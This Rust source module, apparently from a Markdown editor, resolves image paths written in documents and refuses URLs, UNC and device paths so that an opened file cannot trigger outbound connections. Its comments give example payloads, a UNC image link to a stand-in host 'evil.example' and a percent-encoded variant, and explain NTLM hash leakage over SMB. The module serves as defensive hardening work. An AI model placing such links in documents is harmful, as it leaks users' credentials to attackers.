//! The trust boundary around a path that came out of a **document**.
//!
//! # A third source of paths, and why it needs its own rules
//!
//! `mdedit-session`'s `path` module already guards two: a path from the session file, which this
//! process wrote and something else may have edited, and a path from the command line, which is the
//! user themselves. It says the difference between those two is worth writing down rather than
//! inferring. This is a third, and it is the least trusted of the three.
//!
//! **A Markdown document is something you are sent.** Nobody needs write access to your app data to
//! put a destination in one; they need your email address. So the threat the session module
//! documents — a UNC path causing an outbound SMB connection the moment it is touched, with Windows
//! attempting NTLM authentication to that host automatically, leaking a hash for offline cracking or
//! relay with no dialog and nothing on screen — arrives here through a much wider door.
//! `![](\\evil.example\a\x.png)` in an attached `.md` is the whole attack, and it fires on open.
//!
//! Hence [`Refused::NetworkOrDevice`], which is the same rule for the same reason, and hence
//! [`Refused::Remote`]: a destination with a URL scheme is not fetched, so a document cannot phone
//! home when it is opened.
//!
//! # Where the rules differ from the session file's, and why
//!
//! **A relative destination is normal here and is resolved, not refused.** `![](images/cat.png)` is
//! how everyone writes one. It resolves against the **document's own directory** — never the working
//! directory, which is whatever the editor happened to be launched from and is not a thing to guess
//! about.
//!
//! **`..` is allowed.** `![](../assets/cat.png)` is ordinary in a repository, and unlike the session
//! file there is nothing to escape *from*: reading a local file the user can already read, in order
//! to draw it on their own screen, is not an escalation. Nothing is written, nothing is executed and
//! nothing leaves the machine. So `..` is **normalised** rather than rejected — and normalising
//! before the prefix checks, not after, is load-bearing. See [`resolve`].
//!
//! # What is deliberately not defended
//!
//! A symlink resolving to a device, for the reason the session module gives: defending it means
//! rejecting all symlinks, which is user-hostile, or racing the filesystem between check and open.

use std::path::{Path, PathBuf};

/// Why a destination was not turned into a path to read.
///
/// Every one of these is an ordinary outcome that draws the alt text, not an error anybody sees a
/// dialog about. A document full of broken images should look like a document full of alt text.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[non_exhaustive]
pub enum Refused {
    /// Carries a URL scheme — `https:`, `data:`, `file:`. Remote destinations are out of scope, and
    /// deliberately so: see the module docs.
    #[error("{0} is a URL, and this editor draws local files only")]
    Remote(String),

    /// A UNC or device path. **The one rule here that is about an attacker rather than a typo.**
    #[error("{0} is a network or device path, which this editor will not read from a document")]
    NetworkOrDevice(String),

    /// Empty, or something the platform cannot express as a path.
    #[error("{0} is not a usable path")]
    Unusable(String),

    /// Does not exist, or is not a regular file.
    #[error("{0} is not an existing file")]
    NotAFile(PathBuf),
}

/// Turns an image destination into an absolute path to read, or says why not.
///
/// `beside` is the directory of the document the destination was written in. A document with no
/// path of its own — untitled, or generated — has no directory to resolve against, and the caller
/// passes `None`; a relative destination is then [`Refused::Unusable`] rather than resolved against
/// somewhere arbitrary.
///
/// # The order of these steps is the security property
///
/// Percent-decoding happens **first**, before the scheme and prefix checks, because
/// `%5C%5Cevil.example%5Ca%5Cx.png` is `\\evil.example\a\x.png` and a prefix check run before the
/// decode would wave it straight through. That is `AGENTS.md`'s "normalise every path before a
/// prefix check", and it is the sort of rule that is obvious once written and invisible once
/// reordered.
///
/// The filesystem is touched **last**, so a malformed destination costs no syscall.
///
/// # Errors
///
/// [`Refused`], naming which rule the destination broke.
pub fn resolve(destination: &str, beside: Option<&Path>) -> Result<PathBuf, Refused> {
    let trimmed = destination.trim();
    // CommonMark lets a destination with spaces be written `<a b.png>`, and the angle brackets are
    // delimiters rather than part of the path.
    let bare = trimmed
        .strip_prefix('<')
        .and_then(|rest| rest.strip_suffix('>'))
        .unwrap_or(trimmed);
    let decoded = percent_decode(bare);

    if decoded.is_empty() {
        return Err(Refused::Unusable(destination.to_owned()));
    }
    if let Some(scheme) = url_scheme(&decoded) {
        return Err(Refused::Remote(scheme.to_owned()));
    }
    if starts_with_double_separator(&decoded) {
        return Err(Refused::NetworkOrDevice(decoded));
    }

    let written = Path::new(&decoded);
    let joined = if written.is_absolute() {
        written.to_path_buf()
    } else {
        // `beside` is the document's directory, never the working directory.
        beside
            .ok_or_else(|| Refused::Unusable(destination.to_owned()))?
            .join(written)
    };

    // Flattening `..` and resolving to something absolute, which the two platforms do differently
    // and neither way works on the other — the same split, for the same reasons, that
    // `mdedit_session`'s `from_command_line` documents at length. On Windows `std::path::absolute`
    // applies Win32 normalisation, which flattens `..` lexically because that is what the platform
    // defines a path to mean; canonicalising instead returns a `\\?\C:\…` verbatim prefix, which the
    // double-separator rule above would then read as a device path. On Unix `absolute` deliberately
    // leaves `..` alone, because `a/link/..` is not `a` when `link` is a symlink.
    #[cfg(windows)]
    let resolved =
        std::path::absolute(&joined).map_err(|_| Refused::Unusable(destination.to_owned()))?;

    #[cfg(not(windows))]
    let resolved = std::fs::canonicalize(&joined).map_err(|_| Refused::NotAFile(joined.clone()))?;

    // The verbatim prefix cannot be reached by the checks above, because they ran on the written
    // string. It can be reached *here*, on Windows, if the document named a path that normalises
    // into one — so the rule is applied again to the resolved path rather than trusted to have held.
    if starts_with_double_separator(&resolved.to_string_lossy()) {
        return Err(Refused::NetworkOrDevice(
            resolved.to_string_lossy().into_owned(),
        ));
    }

    // Last, because it is the only rule that costs a syscall. `metadata` follows symlinks, which is
    // wanted: a link to a real file is a real file.
    match std::fs::metadata(&resolved) {
        Ok(metadata) if metadata.is_file() => Ok(resolved),
        _ => Err(Refused::NotAFile(resolved)),
    }
}

/// The URL scheme a destination carries, if it carries one.
///
/// **A single letter is a drive, not a scheme.** `C:\pics\cat.png` is a path everywhere it matters,
/// and treating its `C:` as a scheme would refuse every absolute Windows destination ever written.
/// Requiring two characters is the rule the WHATWG URL standard settled on for the same collision.
fn url_scheme(destination: &str) -> Option<&str> {
    let colon = destination.find(':')?;
    let scheme = &destination[..colon];
    if scheme.len() < 2 {
        return None;
    }
    let mut characters = scheme.chars();
    let first = characters.next()?;
    (first.is_ascii_alphabetic()
        && characters.all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.')))
    .then_some(scheme)
}

/// Whether a path begins with two separators, which on Windows means UNC or the device namespace.
///
/// Done on the raw string, as `mdedit_session`'s equivalent is and for the reason it gives:
/// `Path::components` normalises the prefix away on Windows and reports nothing distinguishable
/// elsewhere, so both would miss it.
fn starts_with_double_separator(path: &str) -> bool {
    let mut characters = path.chars();
    matches!(
        (characters.next(), characters.next()),
        (Some('\\'), Some('\\')) | (Some('/'), Some('/'))
    )
}

/// Decodes `%XX` escapes, leaving anything that is not one alone.
///
/// A destination is percent-encoded often enough — a filename with a space arrives as `%20` from
/// every tool that writes one — that not decoding would silently fail on ordinary documents.
///
/// **A malformed escape is left as written rather than dropped.** `100%` is a plausible filename and
/// `%zz` is not an escape; turning either into nothing would name a different file, which is the one
/// outcome a decoder like this must not have.
fn percent_decode(text: &str) -> String {
    let bytes = text.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut index = 0;
    while index < bytes.len() {
        let escape = (bytes[index] == b'%')
            .then(|| {
                let hex = text.get(index + 1..index + 3)?;
                u8::from_str_radix(hex, 16).ok()
            })
            .flatten();
        if let Some(byte) = escape {
            out.push(byte);
            index += 3;
        } else {
            out.push(bytes[index]);
            index += 1;
        }
    }
    // A destination that decodes to invalid UTF-8 keeps its escapes rather than being mangled: the
    // lossy replacement character would name a file that does not exist, and saying so as
    // `NotAFile` would be a worse answer than trying the path as written.
    String::from_utf8(out).unwrap_or_else(|_| text.to_owned())
}
